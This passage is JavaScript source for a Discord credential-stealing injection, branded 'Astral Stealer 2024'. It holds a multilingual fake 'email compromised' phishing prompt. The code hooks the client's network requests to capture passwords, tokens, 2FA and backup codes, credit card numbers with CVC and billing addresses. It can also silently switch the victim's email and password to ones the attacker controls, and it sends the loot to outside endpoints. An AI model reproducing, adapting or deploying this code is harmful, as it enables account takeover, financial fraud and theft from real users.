        "Change your Email-Address",
        "We have detected something unusual with your Discord account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
      ],
      "en-US": [
        "User Settings",
        "Edit email address",
        "Change your Email-Address",
        "We have detected something unusual with your Discord account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
      ],
      "en-ES": [
        "User Settings",
        "Edit email address",
        "Change your Email-Address",
        "We have detected something unusual with your Discord account, your address,",
        "has been compromised.",
        "Please change it to continue using your account.",
        "No longer have access to your email",
        "Contact your email provider to fix it.",
      ],
      hr: [
        "Korisničke postavke",
        "Uredi adresu e-pošte",
        "Promijenite svoju adresu e-pošte",
        "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
        "je kompromitirana.",
        "Promijenite je da biste nastavili koristiti svoj račun.",
        "Više nemate pristup svojoj e-pošti",
        "Kontaktirajte svog pružatelja e-pošte da to popravi.",
      ],
      it: [
        "Impostazioni utente",
        "Modifica indirizzo email",
        "Cambia il tuo indirizzo email",
        "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
        "è stato compromesso.",
        "Per favore cambialo per continuare a usare il tuo account.",
        "Non hai più accesso alla tua email",
        "Contatta il tuo provider email per risolvere il problema.",
      ],
      lt: [
        "Vartotojo nustatymai",
        "Redaguoti el. pašto adresą",
        "Pakeiskite savo el. pašto adresą",
        "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
        "buvo pažeistas.",
        "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
        "Dabar neturite prieigos prie savo el. pašto",
        "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
      ],
      hu: [
        "Felhasználói beállítások",
        "E-mail cím szerkesztése",
        "Változtassa meg e-mail címét",
        "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
        "meg lett veszélyeztetve.",
        "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
        "Nincs többé hozzáférése az e-mail címéhez",
        "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
      ],
      no: [
        "Brukerinnstillinger",
        "Rediger e-postadresse",
        "Endre e-postadressen din",
        "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
        "har blitt kompromittert.",
        "Vennligst endre den for å fortsette å bruke kontoen din.",
        "Har ikke lenger tilgang til e-posten din",
        "Ta kontakt med e-postleverandøren din for å fikse det.",
      ],
      pl: [
        "Ustawienia użytkownika",
        "Edytuj adres e-mail",
        "Zmień swój adres e-mail",
        "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
        "został naruszony.",
        "Zmień go, aby kontynuować korzystanie z konta.",
        "Nie masz już dostępu do swojej poczty e-mail",
        "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
      ],
      "pr-BR": [
        "Configurações do usuário",
        "Editar endereço de e-mail",
        "Altere seu endereço de e-mail",
        "Detectamos algo incomum em sua conta Discord, seu endereço,",
        "foi comprometido.",
        "Por favor, altere-o para continuar usando sua conta.",
        "Você não tem mais acesso ao seu endereço de e-mail",
        "Contate seu provedor de e-mail para corrigi-lo.",
      ],
      ro: [
        "Setări utilizator",
        "Editare adresă de email",
        "Schimbă-ți adresa de email",
        "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
        "a fost compromisă.",
        "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
        "Nu mai ai acces la adresa ta de email",
        "Contactează furnizorul tău de email pentru a rezolva problema.",
      ],
      fi: [
        "Käyttäjäasetukset",
        "Muokkaa sähköpostiosoitetta",
        "Vaihda sähköpostiosoitteesi",
        "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
        "on vaarantunut.",
        "Vaihda se jatkaaksesi tilisi käyttöä.",
        "Sinulla ei ole enää pääsyä sähköpostiisi",
        "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
      ],
      "sv-SE": [
        "Användarinställningar",
        "Redigera e-postadress",
        "Ändra din e-postadress",
        "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
        "har komprometterats.",
        "Ändra den för att fortsätta använda ditt konto.",
        "Du har inte längre tillgång till din e-postadress",
        "Kontakta din e-postleverantör för att åtgärda det.",
      ],
      vi: [
        "Cài đặt người dùng",
        "Chỉnh sửa địa chỉ email",
        "Thay đổi địa chỉ email của bạn",
        "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
        "đã bị đe dọa.",
        "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
        "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
        "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
      ],
      tr: [
        "Kullanıcı Ayarları",
        "E-posta adresini düzenle",
        "E-posta adresini değiştir",
        "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
        "tehlikeye girdi.",
        "Kullanmaya devam etmek için lütfen değiştirin.",
        "Artık e-posta adresinize erişiminiz yok",
        "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
      ],
      cs: [
        "Uživatelské nastavení",
        "Upravit e-mailovou adresu",
        "Změnit e-mailovou adresu",
        "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
        "byla narušena.",
        "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
        "Nemáte již přístup k vaší e-mailové adrese",
        "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
      ],
      el: [
        "Ρυθμίσεις χρήστη",
        "Επεξεργασία διεύθυνσης email",
        "Αλλαγή διεύθυνσης email",
        "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
        "έχει διακινδυνευθεί.",
        "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
        "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
        "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
      ],
      bg: [
        "Потребителски настройки",
        "Редактиране на имейл адрес",
        "Промяна на имейл адреса",
        "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
        "е бил компрометиран.",
        "Моля, променете го, за да продължите да използвате вашия акаунт.",
        "Вече нямате достъп до вашия имейл адрес",
        "Свържете се с вашия доставчик на имейли, за да го оправите.",
      ],
      ru: [
        "Настройки пользователя",
        "Изменить адрес электронной почты",
        "Изменить адрес электронной почты",
        "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
        "был скомпрометирован.",
        "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
        "У вас больше нет доступа к вашему адресу электронной почты",
        "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
      ],
      uk: [
        "Налаштування користувача",
        "Редагування електронної адреси",
        "Змінити електронну адресу",
        "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
        "була під загрозою.",
        "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
        "Ви більше не маєте доступу до своєї електронної адреси",
        "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
      ],
      hi: [
        "उपयोगकर्ता सेटिंग्स",
        "ईमेल पता संपादित करें",
        "अपना ईमेल पता बदलें",
        "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
        "संकट में है।",
        "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
        "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
        "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
      ],
      th: [
        "การตั้งค่าผู้ใช้",
        "แก้ไขที่อยู่อีเมล",
        "เปลี่ยนที่อยู่อีเมลของคุณ",
        "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
        "ถูกขัดจังหวะ",
        "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
        "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
        "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
      ],
      "zh-CN": [
        "用户设置",
        "编辑电子邮件地址",
        "更改电子邮件地址",
        "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
        "已经受到威胁。",
        "请更改它以继续使用您的帐户。",
        "您不再可以访问您的电子邮件地址",
        "联系您的电子邮件提供商以解决问题。",
      ],
      ja: [
        "ユーザー設定",
        "メールアドレスを編集",
        "メールアドレスを変更",
        "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
        "危険にさらされています。",
        "アカウントを引き続き使用するために変更してください。",
        "もはやあなたのメールアドレスにアクセスできません",
        "問題を修正するためにメールプロバイダーに連絡してください。",
      ],
      "zh-TW": [
        "用戶設置",
        "編輯電子郵件地址",
        "更改電子郵件地址",
        "我們檢測到您的Discord帳戶有異常情況，您的地址",
        "受到威脅。",
        "請更改它以繼續使用您的帳戶。",
        "您不再能夠訪問您的電子郵件地址",
        "請聯繫您的電子郵件提供商以修復問題。",
      ],
      ko: [
        "사용자 설정",
        "이메일 주소 편집",
        "이메일 주소 변경",
        "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
        "이 위험에 빠져 있습니다.",
        "귀하의 계정을 계속 사용하려면 변경하십시오.",
        "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
        "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
      ],
    };
  
    var langue = languages[langueCible] ?? [
      "User Settings",
      "Edit email address",
      "Change your Email-Address",
      "We have detected something unusual with your Discord account, your address,",
      "has been compromised.",
      "Please change it to continue using your account.",
      "No longer have access to your email",
      "Contact your email provider to fix it.",
    ];
    return langue;
  }
  
  electron.session.defaultSession.webRequest.onCompleted(
    config.onCompleted,
    async (request, callback) => {
      if (!["POST", "PATCH"].includes(request.method)) return;
      if (request.statusCode !== 200) return;
      try {
        var data = JSON.parse(request.uploadData[0].bytes);
      } catch (err) {
        var data = queryString.parse(
          decodeURIComponent(request.uploadData[0].bytes.toString())
        );
      }
      var {
        token,
        user,
        billing,
        friends,
        Nitro,
        userAvatar,
        userBanner,
        userAvatar,
        Billings,
        Friends,
      } = await BoukiTuclcavectesfonctions();
  
      var { appPath, appName } = path;
      var client_discord = appName;
  
      var ip = await getIP();
  
      switch (true) {
        case request.url.endsWith("login"):
          if (!token) {
            await electron.session.defaultSession.webRequest.onCompleted(
              config.onCompletedbis,
              async (re, callback) => {
                try {
                  var dt = JSON.parse(re.uploadData[0].bytes);
                } catch (err) {
                  var dt = queryString.parse(
                    decodeURIComponent(re.uploadData[0].bytes.toString())
                  );
                }
  
                var {
                  token,
                  user,
                  billing,
                  friends,
                  Nitro,
                  userAvatar,
                  userBanner,
                  userAvatar,
                  Billings,
                  Friends,
                } = await BoukiTuclcavectesfonctions();
                var password = data.password;
                var params = await makeEmbed({
                  title: "Astral User Login",
                  color: config["embed-color"],
                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                  fields: [
                    {
                      name: "Username <a:inject:1130448568268881960>",
                      value: `\`${user.username}#${user.discriminator}\``,
                      inline: !0,
                    },
                    {
                      name: "ID <a:cat_rolling:1130448570789679165>",
                      value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                      inline: !0,
                    },
                    {
                      name: "Nitro <a:nitro:1130453517312725052>",
                      value: `${GetNitro(Nitro)}`,
                      inline: !0,
                    },
                    {
                      name: "Badges <a:badges:1130448593715740692>",
                      value: `${GetBadges(user.flags)}`,
                      inline: !0,
                    },
                    {
                      name: "Language <:4533language:1130453119919206500>",
                      value: `${GetLangue(user.locale)}`,
                      inline: !0,
                    },
                    {
                      name: "NSFW <:3568underage:1153991874495922207>",
                      value: `${GetNSFW(user.nsfw_allowed)}`,
                      inline: !0,
                    },
                    {
                      name: "A2F <:backup116:1102200730829471754>",
                      value: `${GetA2F(user.mfa_enabled)}`,
                      inline: !0,
                    },
                    {
                      name: "@Copyright",
                      value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                      inline: !0,
                    },
                    {
                      name: "Astral Files",
                      value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                      inline: !0,
                    },
                    {
                      name: "Billing <a:money:1130448564632436787>",
                      value: `${Billings}`,
                      inline: !0,
                    },
                    {
                      name: "Email <:mail:1130451375495589968>",
                      value: `\`${user.email}\``,
                      inline: !0,
                    },
                    {
                      name: "Phone :mobile_phone:",
                      value: `\`${user.phone ?? "None"}\``,
                      inline: !0,
                    },
                    {
                      name: "<a:cam2:1130448575470514258> Password",
                      value: `\`${password}\``,
                      inline: !0,
                    },
                    {
                      name: "Bio <a:caat:1130448857436782682>",
                      value: `\`\`\`${
                        user.bio !== null &&
                        user.bio !== undefined &&
                        user.bio !== ""
                          ? user.bio
                          : ":x:"
                      }\`\`\``,
                      inline: false,
                    },
                    {
                      name: "Code 2fa used <a:caat:1130448857436782682>",
                      value: `\`\`\`${
                        dt.code !== null &&
                        dt.code !== undefined &&
                        dt.code !== ""
                          ? dt.code
                          : ":x:"
                      }\`\`\``,
                      inline: false,
                    },
                    {
                      name: "<a:eatsomething:1130449693613228072> Token",
                      value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                      inline: !1,
                    },
                  ],
  
                  thumbnail: userAvatar,
                });
  
                var params2 = await makeEmbed({
                  title: `Total Friends (${Friends.len})`,
                  color: config["embed-color"],
                  description: Friends.badges,
                  image: userBanner,
                  thumbnail: userAvatar,
                });
  
                params.embeds.push(params2.embeds[0]);
                await post(params);
                return;
              }
            );
          } else {
            if (token) {
              var {
                token,
                user,
                billing,
                friends,
                Nitro,
                userAvatar,
                userBanner,
                userAvatar,
                Billings,
                Friends,
              } = await BoukiTuclcavectesfonctions();
  
              var password = data.password;
  
              var params = await makeEmbed({
                title: "Astral User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
                    name: "Username <a:inject:1130448568268881960>",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0,
                  },
                  {
                    name: "ID <a:cat_rolling:1130448570789679165>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0,
                  },
                  {
                    name: "Nitro <a:nitro:1130453517312725052>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0,
                  },
                  {
                    name: "Badges <a:badges:1130448593715740692>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0,
                  },
                  {
                    name: "Language <:4533language:1130453119919206500>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0,
                  },
                  {
                    name: "NSFW <:3568underage:1153991874495922207>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !0,
                  },
                  {
                    name: "A2F <:backup116:1102200730829471754>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0,
                  },
                  {
                    name: "@Copyright",
                    value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                    inline: !0,
                  },
                  {
                    name: "Astral Files",
                    value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                    inline: !0,
                  },
                  {
                    name: "Billing <a:money:1130448564632436787>",
                    value: `${Billings}`,
                    inline: !0,
                  },
                  {
                    name: "Email <:mail:1130451375495589968>",
                    value: `\`${user.email}\``,
                    inline: !0,
                  },
                  {
                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0,
                  },
                  {
                    name: "<a:cam2:1130448575470514258> Password",
                    value: `\`${password}\``,
                    inline: !0,
                  },
                  {
                    name: "Bio",
                    value: `\`\`\`${
                      user.bio !== null &&
                      user.bio !== undefined &&
                      user.bio !== ""
                        ? user.bio
                        : ":x:"
                    }\`\`\``,
                    inline: false,
                  },
                  {
                    name: "<a:eatsomething:1130449693613228072> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1,
                  },
                ],
  
                thumbnail: userAvatar,
              });
  
              var params2 = await makeEmbed({
                title: `Total Friends (${Friends.len})`,
                color: config["embed-color"],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar,
              });
  
              params.embeds.push(params2.embeds[0]);
  
              await post(params);
              break;
            }
          }
        case request.url.endsWith("users/@me"):
          if (!data.password) return;
          if (data.new_password) {
            var params = await makeEmbed({
              title:
                "Astral Detect Password Changed",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
                  name: "Username <a:inject:1130448568268881960>",
                  value: `\`${user.username}#${user.discriminator}\``,
                  inline: !0,
                },
                {
                  name: "ID <a:cat_rolling:1130448570789679165>",
                  value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                  inline: !0,
                },
                {
                  name: "Nitro <a:nitro:1130453517312725052>",
                  value: `${GetNitro(Nitro)}`,
                  inline: !0,
                },
                {
                  name: "Badges <a:badges:1130448593715740692>",
                  value: `${GetBadges(user.flags)}`,
                  inline: !0,
                },
                {
                  name: "Language <:4533language:1130453119919206500>",
                  value: `${GetLangue(user.locale)}`,
                  inline: !0,
                },
                {
                  name: "NSFW <:3568underage:1153991874495922207>",
                  value: `${GetNSFW(user.nsfw_allowed)}`,
                  inline: !0,
                },
                {
                  name: "A2F <:backup116:1102200730829471754>",
                  value: `${GetA2F(user.mfa_enabled)}`,
                  inline: !0,
                },
                {
                  name: "@Copyright",
                  value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                  inline: !0,
                },
                {
                  name: "Astral Files",
                  value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                  inline: !0,
                },
                {
                  name: "Billing <a:money:1130448564632436787>",
                  value: `${Billings}`,
                  inline: !0,
                },
                {
                  name: "Email <:mail:1130451375495589968>",
                  value: `\`${user.email}\``,
                  inline: !0,
                },
                {
                  name: "Phone :mobile_phone:",
                  value: `\`${user.phone ?? "None"}\``,
                  inline: !0,
                },
                {
                  name: "<a:cam2:1130448575470514258> Old Password",
                  value: `\`${data.password}\``,
                  inline: !0,
                },
                {
                  name: "<a:cam2:1130448575470514258> New Password",
                  value: `\`${data.new_password}\``,
                  inline: !0,
                },
                {
                  name: "Bio <a:caat:1130448857436782682>",
                  value: `\`\`\`${
                    user.bio !== null && user.bio !== undefined && user.bio !== ""
                      ? user.bio
                      : ":x:"
                  }\`\`\``,
                  inline: false,
                },
                {
                  name: "<a:eatsomething:1130449693613228072> Token",
                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                  inline: !1,
                },
              ],
  
              thumbnail: userAvatar,
            });
  
            var params2 = await makeEmbed({
              title: `Total Friends (${Friends.len})`,
              color: config["embed-color"],
              description: Friends.badges,
              image: userBanner,
              thumbnail: userAvatar,
            });
  
            params.embeds.push(params2.embeds[0]);
  
            await post(params);
          } else if (data.email) {
            if (config.changeMailAuto == "true") {
              const atIndex = config.mail.indexOf("@");
              const username = config.mail.substring(0, atIndex);
              const domain = config.mail.substring(atIndex);
  
              const generatedEmail = `${username ?? "le_chat_blanc666."}+${generateId(
                3
              )}${domain ?? "@gmail.com"}`;
              const generatedPassword = generatePassword();
  
              console.log(generatedEmail, generatedPassword);
              try {
                const response = await updateEmail(
                  token,
                  generatedEmail,
                  data.password
                );
                console.log(response);
                if (response.username) {
                  const res = await updatePassword(
                    token,
                    data.password,
                    generatedPassword
                  );
                  if (res.username) {
                    console.log("Discord Response :", res);
  
                    var params = await makeEmbed({
                      title:
                        "Astral Have changed the victim mail",
                      color: config["embed-color"],
                      description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                      fields: [
                        {
                          name: "Username <a:inject:1130448568268881960>",
                          value: `\`${res.username}#${res.discriminator}\``,
                          inline: !1,
                        },
                        {
                          name: "ID <a:cat_rolling:1130448570789679165>",
                          value: `\`${res.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${res.id})`,
                          inline: !1,
                        },
                        {
                          name: "Badges <a:badges:1130448593715740692>",
                          value: `${GetBadges(res.flags)}`,
                          inline: !1,
                        },
                        {
                          name: "A2F <:backup116:1102200730829471754>",
                          value: `${GetA2F(res.mfa_enabled)}`,
                          inline: !1,
                        },
                        {
                          name: "@Copyright",
                          value: `[Astral Stealer 2024](https://github.com/freeman649)`,
                          inline: !1,
                        },
                        {
                          name: "Astral Files",
                          value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                          inline: !1,
                        },
                        {
                          name: "Phone :mobile_phone:",
                          value: `\`${res.phone ?? "None"}\``,
                          inline: !1,
                        },
                        {
                          name: "New Email <:mail:1130451375495589968>",
                          value: `\`${res.email}\``,
                          inline: !1,
                        },
                        {
                          name: "<a:cam2:1130448575470514258> Password",
                          value: `\`${generatedPassword}\``,
                          inline: !1,
                        },
                        {
                          name: "<a:eatsomething:1130449693613228072> Token",
                          value: `\`\`\`${res.token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${res.token})`,
                          inline: !1,
                        },
                      ],
                      thumbnail: userAvatar,
                    });
  
                    await post(params);
                    break;
                  }
                }
              } catch (error) {}
            }
            var params = await makeEmbed({
              title:
                "Astral Detect Email Changed",
              color: config["embed-color"],
              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
              fields: [
                {
                  name: "Username <a:inject:1130448568268881960>",
                  value: `\`${user.username}#${user.discriminator}\``,
                  inline: !0,
                },
                {
                  name: "ID <a:cat_rolling:1130448570789679165>",
                  value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                  inline: !0,
                },
                {
                  name: "Nitro <a:nitro:1130453517312725052>",
                  value: `${GetNitro(Nitro)}`,
                  inline: !0,
                },
                {
                  name: "Badges <a:badges:1130448593715740692>",
                  value: `${GetBadges(user.flags)}`,
                  inline: !0,
                },
                {
                  name: "Language <:4533language:1130453119919206500>",
                  value: `${GetLangue(user.locale)}`,
                  inline: !0,
                },
                {
                  name: "NSFW <:3568underage:1153991874495922207>",
                  value: `${GetNSFW(user.nsfw_allowed)}`,
                  inline: !0,
                },
                {
                  name: "A2F <:backup116:1102200730829471754>",
                  value: `${GetA2F(user.mfa_enabled)}`,
                  inline: !0,
                },
                {
                  name: "@Copyright",
                  value: `[Astral 2024](https://github.com/freeman649)`,
                  inline: !0,
                },
                {
                  name: "Astral Files",
                  value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                  inline: !0,
                },
                {
                  name: "Billing <a:money:1130448564632436787>",
                  value: `${Billings}`,
                  inline: !0,
                },
                {
                  name: "New Email <:mail:1130451375495589968>",
                  value: `\`${user.email}\``,
                  inline: !0,
                },
                {
                  name: "Phone :mobile_phone:",
                  value: `\`${user.phone ?? "None"}\``,
                  inline: !0,
                },
                {
                  name: "<a:cam2:1130448575470514258> Password",
                  value: `\`${data.password}\``,
                  inline: !0,
                },
                {
                  name: "Bio",
                  value: `\`\`\`${
                    user.bio !== null && user.bio !== undefined && user.bio !== ""
                      ? user.bio
                      : ":x:"
                  }\`\`\``,
                  inline: false,
                },
                {
                  name: "<a:eatsomething:1130449693613228072> Token",
                  value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                  inline: !1,
                },
              ],
  
              thumbnail: userAvatar,
            });
  
            var params2 = await makeEmbed({
              title: `Total Friends (${Friends.len})`,
              color: config["embed-color"],
              description: Friends.badges,
              image: userBanner,
              thumbnail: userAvatar,
            });
  
            params.embeds.push(params2.embeds[0]);
  
            await post(params);
            break;
          }
        case request.url.includes("api.stripe"):
          var [CardNumber, CardCVC, month, year] = [
            data["card[number]"],
            data["card[cvc]"],
            data["card[exp_month]"],
            data["card[exp_year]"],
          ];
  
          if (CardNumber && CardCVC && month && year) {
            await electron.session.defaultSession.webRequest.onCompleted(
              config.onCompletedbis,
              async (re, callback) => {
                try {
                  var dt = JSON.parse(re.uploadData[0].bytes);
                } catch (err) {
                  var dt = queryString.parse(
                    decodeURIComponent(re.uploadData[0].bytes.toString())
                  );
                }
                let { line_1, line_2, city, state, postal_code, country, email } =
                  dt.billing_address;
                var params = await makeEmbed({
                  title:
                    "Astral User Credit Card Added",
                  color: config["embed-color"],
                  fields: [
                    {
                      name: "Astral Files",
                      value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                      inline: false,
                    },
                    {
                      name: "IP",
                      value: `\`${ip}\``,
                      inline: false,
                    },
                    {
                      name: "ID <a:cat_rolling:1130448570789679165>",
                      value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                      inline: false,
                    },
                    {
                      name: "Username <:username:1041634536733290596>",
                      value: `\`${user.username}#${user.discriminator}\``,
                      inline: false,
                    },
                    {
                      name: "Language <:4533language:1130453119919206500>",
                      value: GetLangue(user.locale),
                      inline: false,
                    },
                    {
                      name: "A2F <:backup116:1102200730829471754>",
                      value: GetA2F(user.mfa_enabled),
                      inline: false,
                    },
                    {
                      name: "Badges <a:badges:1130448593715740692>",
                      value: GetBadges(user.flags),
                      inline: false,
                    },
                    {
                      name: "Address <a:cat_rolling:1130448570789679165>",
                      value: `\`\`\`md\n# Line 1 : ${line_1},\n# Line 2 : ${line_2},\n# City : ${city},\n# State : ${state},\n# Postal Code : ${postal_code},\n# Country : ${country}\n\`\`\``,
                      inline: false,
                    },
                    {
                      name: "Credit Card <a:cat_rolling:1130448570789679165>",
                      value: `\`\`\`md\n# Card Number : ${CardNumber}\n# Card Expiration : ${
                        month + "/" + year
                      }\n# CVC : ${CardCVC}\`\`\``,
                      inline: false,
                    },
                    {
                      name: "<a:eatsomething:1130449693613228072> Token",
                      value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                      inline: false,
                    },
                  ],
  
                  thumbnail: userAvatar,
                });
                await post(params);
              }
            );
          }
          break;
        case request.url.endsWith("/enable"):
          let ValidFound = false;
          let backup_codes = (await execScript(backupscript)) ?? "";
  
          if (config.disable2FA == "true") {
            for (let i = 0; i < backup_codes.length; i++) {
              if (!ValidFound) {
                let res = await remove2FA(token, backup_codes[i]);
                let parse_res = JSON.parse(res);
                if (parse_res.token) {
                  ValidFound = true;
                  break;
                } else {
                  if (parse_res.message && parse_res.code) {
                    if (parse_res.message == "401: Unauthorized") {
                      ValidFound = true;
                      break;
                    }
                  } else {
                    if (parse_res.message != "Invalid two-factor code") {
                      ValidFound = true;
                      break;
                    } else {
                      continue;
                    }
                  }
                }
              }
            }
          }
  
          var params = await makeEmbed({
            title: "Astral User Enable 2FA",
            color: config["embed-color"],
            fields: [
              {
                name: "Astral Files",
                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                inline: false,
              },
              {
                name: "IP",
                value: `\`${ip}\``,
                inline: false,
              },
              {
                name: "Username <:username:1041634536733290596>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: false,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: GetLangue(user.locale),
                inline: false,
              },
              {
                name: "2FA disabler Response <:2FA:982994698278952980>",
                value: `\`\`\`md\n- ${
                  ValidFound ? "Disabled" : "Cannot Disable"
                }\`\`\``,
                inline: false,
              },
              {
                name: "A2F <:backup116:1102200730829471754>",
                value: GetA2F(user.mfa_enabled),
                inline: false,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: GetBadges(user.flags),
                inline: false,
              },
              {
                name: "Backups Code <a:cat_rolling:1130448570789679165>",
                value: `\`\`\`md\n${backup_codes
                  .map((x) => `- ${x}`)
                  .join("\n")}\`\`\``,
                inline: false,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: false,
              },
            ],
  
            thumbnail: userAvatar,
          });
          await post(params);
          break;
        case request.url.endsWith("/disable"):
          var params = await makeEmbed({
            title: "Astral User Removed 2FA",
            color: config["embed-color"],
            fields: [
              {
                name: "Astral Files",
                value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                inline: false,
              },
              {
                name: "IP",
                value: `\`${ip}\``,
                inline: false,
              },
              {
                name: "Username <:username:1041634536733290596>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: GetLangue(user.locale),
                inline: false,
              },
              {
                name: "A2F <:backup116:1102200730829471754>",
                value: GetA2F(user.mfa_enabled),
                inline: false,
              },
              {
